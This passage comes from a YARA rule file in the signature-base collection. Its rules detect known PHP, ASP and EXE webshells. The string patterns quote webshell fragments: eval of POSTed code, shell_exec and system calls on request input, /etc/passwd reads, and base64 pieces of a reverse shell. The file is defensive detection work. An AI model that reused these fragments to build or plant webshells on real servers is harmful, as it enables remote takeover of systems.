		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
		logic_hash = "5d49f2599781836156f6bbb0c50cfcffdb2ca51c7cb688abbc6245d7f856ad01"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lolipop_1
{
	meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6620-L6633"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
		logic_hash = "8b0dcf76a244f80d4bee0c62189df55c1f8d71cf0900cd8ebb5916f5fe972bed"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Simple_Cmd_1
{
	meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1fd0c01a-c265-5e30-ab36-e8e93e316fbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6634-L6648"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
		logic_hash = "82a65f4bbdcd2fc626aa9f36fe530d19aa19a48389e970c26e525597818914ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "10546549-e16d-567d-9d88-3d37fe8ff03f"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_aZRaiLPhp_v1_0"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6665-L6680"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
		logic_hash = "8309338bb327cc14ae5970bd921b3dba68353d55be31b9dbbc5374ded24ed563"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lostdc_1
{
	meta:
		description = "PHP Webshells Github Archive - file lostDC.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6709-L6724"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
		logic_hash = "e3cd28f4a72f5a8a92c728fe76a7159c28256e87daf4c1dd10190a57263f5b45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
		$s4 = "header ( \"Content-Description: Download manager\" );" fullword
		$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
		$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
		$s12 = "$ret = shellexec($command);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Casus_1_5_1
{
	meta:
		description = "PHP Webshells Github Archive - file CasuS 1.5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "cf89d8f8-d498-57fe-98eb-a98350db182f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6725-L6738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7eee8882ad9b940407acc0146db018c302696341"
		logic_hash = "0dbaa39bd33047d24e5bc9716108c5581da3f54e93d90f9c550b3d84de1ebfe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
		$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
		$s18 = "if (file_exists(\"F:\\\\\")){" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Ftpsearch_1
{
	meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9db8f00a-1843-5057-b8c7-a7f7b63e0659"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6739-L6753"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
		logic_hash = "6b32553be4fdf26776e3cbb8a5d4d011d88f2bd50949b65934df72b89065aeec"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Cyber_Shell_Cybershell_Cyber_Shell__V_1_0__1
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth (Nextron Systems)"
		id = "79146f25-87b9-5216-af88-4e433bb08b90"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6754-L6771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "fc2cf9a25ccc5aa3d9dc287ef9600b065ba9025cfb0a1ccca1bce9120ea03ff4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"

	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_Soldierofallah_1
{
	meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a158d158-d48d-514c-8b7b-4b6a4a10d021"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6772-L6792"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0b9e0d96c8a618a4883235e8c5c9a03a1e0b586cb4b30e0273e24c35ee5ee502"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"

	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_7_1
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "506373d6-31b4-5a14-b009-f2b43028a98b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6793-L6811"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9d9b6b1333f2061c357fad110b5cc508288c70aea1212aa2fcbf283a2ce4fb2c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "de98f890790756f226f597489844eb3e53a867a9"
		hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
		hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
		hash3 = "715f17e286416724e90113feab914c707a26d456"

	strings:
		$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
		$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
		$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
		$s4 = "if( $action == \"dumpTable\" )" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Small_Web_Shell_By_Zaco_Small_Zaco_Zacosmall_1
{
	meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		author = "Florian Roth (Nextron Systems)"
		id = "99dbcea6-7208-5bbe-b200-9ea3074d7855"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6812-L6830"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "840c58043e39014e90e7621c1d2417d5a970c744560738abc4fea3db3cbb8d5a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"

	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_8_1
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "40c6f69f-9963-5e4f-af44-041d47738519"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6831-L6850"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "346df2686c4d43b3210b07a30845477e057602500e67baba69b50c41e8d501fa"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
		hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
		hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"

	strings:
		$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
		$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s3 = "/* I added this to ensure the script will run correctly..." fullword
		$s14 = "<!--    </form>   -->" fullword
		$s15 = "<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">" fullword
		$s20 = "elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_Klasvayv_Asp_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php, klasvayv.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6851-L6869"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "42959ba1e3c0f7f198f953e98b9df87059999f5526df4338c109828d0a5a518a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
		hash3 = "4f83bc2836601225a115b5ad54496428a507a361"

	strings:
		$s1 = "<font color=\"#000000\">Sil</font></a></font></td>" fullword
		$s5 = "<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">" fullword
		$s6 = "onfocus=\"if (this.value == 'Kullan" fullword
		$s16 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\">"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__PH_Vayv_Phvayv_PH_Vayv_1
{
	meta:
		description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1575591b-3245-5c3d-b2a4-6def89e77032"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6893-L6909"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b2f2b95415bc990adac38eada20cbc793f286d51f2054bc969e9c667f16717f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
		hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
		hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"

	strings:
		$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
		$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
		$s17 = "name=\"duzenx2\" value=\"Klas" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Crystalshell_V_1_Erne_Stres_1
{
	meta:
		description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, erne.php, stres.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4e73e42e-b968-5b68-a00d-d2a8a1f3541c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6952-L6973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a0484a5a71715d6a79c89e20919ab89aaa7e85a18ee502651f1f6b29153847a3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash1 = "6eb4ab630bd25bec577b39fb8a657350bf425687"
		hash2 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s1 = "<input type='submit' value='  open (shill.txt) '>" fullword
		$s4 = "var_dump(curl_exec($ch));" fullword
		$s7 = "if(empty($_POST['Mohajer22'])){" fullword
		$s10 = "$m=$_POST['curl'];" fullword
		$s13 = "$u1p=$_POST['copy'];" fullword
		$s14 = "if(empty(\\$_POST['cmd'])){" fullword
		$s15 = "$string = explode(\"|\",$string);" fullword
		$s16 = "$stream = imap_open(\"/etc/passwd\", \"\", \"\");" fullword

	condition:
		5 of them
}

rule SIGNATURE_BASE_Webshell_GFS_1
{
	meta:
		description = "PHP Webshells Github Archive - from files GFS web-shell ver 3.1.7 - PRiV8.php, Predator.php, GFS_web-shell_ver_3.1.7_-_PRiV8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bde6cfd8-466f-528a-b1e3-f874aa778010"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7018-L7034"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "72a3f117cb11e1461b760c47a3de74283640b6e1daa87b24e45210213bb76609"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "c2f1ef6b11aaec255d4dd31efad18a3869a2a42c"
		hash1 = "34f6640985b07009dbd06cd70983451aa4fe9822"
		hash2 = "d25ef72bdae3b3cb0fc0fdd81cfa58b215812a50"

	strings:
		$s0 = "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";" fullword
		$s1 = "lIENPTk47DQpleGl0IDA7DQp9DQp9\";" fullword
		$s2 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShm"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_10_1
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php, PHPRemoteView.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f52013d6-72ce-544c-a7ef-ae2a2ea87108"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7056-L7076"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0bf731edef55cde5d2ad16510fb9f1a240c1a06b535af7e13300fdbea470df74"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
		hash3 = "7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57"

	strings:
		$s2 = "$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; " fullword
		$s6 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; " fullword
		$s11 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; " fullword
		$s12 = "else if( $mode & 0xA000 ) " fullword
		$s17 = "$s=sprintf(\"%1s\", $type); " fullword
		$s20 = "font-size: 8pt;" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_11_1
{
	meta:
		description = "PHP Webshells Github Archive - from files rootshell.php, Rootshell.v.1.0.php, s72 Shell v1.1 Coding.php, s72_Shell_v1.1_Coding.php"
		author = "Florian Roth (Nextron Systems)"
		id = "590c5320-ef85-5522-94fd-4619749f7eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7077-L7099"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5a559a26314ce603d6454efb71f1243bf89daed920ca2a495a51b94a4cca0045"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "31a82cbee8dffaf8eb7b73841f3f3e8e9b3e78cf"
		hash1 = "838c7191cb10d5bb0fc7460b4ad0c18c326764c6"
		hash2 = "8dfcd919d8ddc89335307a7b2d5d467b1fd67351"
		hash3 = "80aba3348434c66ac471daab949871ab16c50042"

	strings:
		$s5 = "$filename = $backupstring.\"$filename\";" fullword
		$s6 = "while ($file = readdir($folder)) {" fullword
		$s7 = "if($file != \".\" && $file != \"..\")" fullword
		$s9 = "$backupstring = \"copy_of_\";" fullword
		$s10 = "if( file_exists($file_name))" fullword
		$s13 = "global $file_name, $filename;" fullword
		$s16 = "copy($file,\"$filename\");" fullword
		$s18 = "<td width=\"49%\" height=\"142\">" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell__Findsock_Php_Findsock_Shell_Php_Reverse_Shell_1
{
	meta:
		description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "6567c8f1-bd7f-5844-b937-3db2d8eb7408"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7100-L7114"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2459f7114482e17f087bda4b638c29e237f2f3cb5a9e41e326ed65fc1834b6be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
		hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
		hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"

	strings:
		$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_6_1
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "e61ec617-565a-5b24-82f4-3677ef379a06"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7115-L7136"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7b3f2ca3cb9516ddda1b9cac2ca5eb5d9e62e1839dad041f69a3dc7a2a186897"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
		hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
		hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
		hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
		hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"

	strings:
		$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
		$s5 = "echo shell_exec($com);" fullword
		$s7 = "if($sertype == \"winda\"){" fullword
		$s8 = "function execute($com)" fullword
		$s12 = "echo decode(execute($cmd));" fullword
		$s15 = "echo system($com);" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Unpack_Injectt_1
{
	meta:
		description = "Webshells Auto-generated - file Injectt.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "80dc3086-41a6-5e30-bbf4-463500fe5e33"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7138-L7151"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a5d2158a566c87edc999771e12d42c5"
		logic_hash = "d8e9ed4f2604617bd6410f36ab827affa3cc6729ba996d0d9cd9c8eb0fd96533"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "%s -Run                              -->To Install And Run The Service"
		$s3 = "%s -Uninstall                        -->To Uninstall The Service"
		$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Fso_1
{
	meta:
		description = "Webshells Auto-generated - file fso.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "094eeff9-0da0-5a44-a45c-f8ee57861e7a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7152-L7164"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b37f3cde1a08890bd822a182c3a881f6"
